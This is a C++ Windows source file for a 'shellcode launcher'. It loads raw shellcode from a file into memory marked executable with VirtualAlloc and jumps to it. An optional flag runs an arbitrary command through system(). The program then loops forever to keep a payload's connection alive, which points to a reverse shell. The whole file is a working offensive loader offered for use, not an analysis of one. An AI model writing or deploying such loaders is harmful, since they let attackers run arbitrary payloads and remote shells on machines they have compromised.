#include <iostream>
#include <fstream>
#include <vector>
#include <windows.h>

void PrintLastError(const std::string& context) {
    DWORD errCode = GetLastError();
    LPVOID errMsg;
    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&errMsg,
        0, NULL);
    
    std::cerr << "[!] Error in " << context << ": " << (char*)errMsg;
    LocalFree(errMsg);
}

void ExecuteShellcode(const std::vector<unsigned char>& shellcode) {
    std::cout << "[*] Allocating memory for shellcode (" << shellcode.size() << " bytes)...\n";
    void* exec_mem = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        PrintLastError("VirtualAlloc");
        return;
    }

    memcpy(exec_mem, shellcode.data(), shellcode.size());

    std::cout << "[*] Executing shellcode...\n";
    ((void(*)())exec_mem)(); // ⚠️ Shellcode will keep running

    std::cout << "[*] Keeping memory allocated. Not freeing to keep connection alive...\n";
}

int main(int argc, char* argv[]) {
    std::cout << "[*] Shellcode Launcher Starting...\n";

    if (argc < 2) {
        std::cerr << "[!] Usage: " << argv[0] << " <shellcode_file> [-c \"command\"]\n";
    }

    const char* shellcode_file = argv[1];

    // Run command if provided
    if (argc >= 4 && std::string(argv[2]) == "-c") {
        std::string cmd = argv[3];
        std::cout << "[*] Running command: " << cmd << "\n";
        int result = system(cmd.c_str());
        if (result != 0) {
            std::cerr << "[!] Command failed: " << cmd << "\n";
        }
    }

    // Load shellcode
    std::ifstream file(shellcode_file, std::ios::binary);
    if (!file) {
        std::cerr << "[!] Failed to open shellcode file: " << shellcode_file << "\n";
    } else {
        std::vector<unsigned char> shellcode((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        
        if (shellcode.empty()) {
            std::cerr << "[!] Shellcode file is empty.\n";
        } else {
            ExecuteShellcode(shellcode);
        }
    }

    std::cout << "[*] Shellcode execution started. Connection will remain alive...\n";

    // Infinite loop to prevent termination (Keep-alive)
    while (true) {
        Sleep(1000);
    }

    return 0;
}
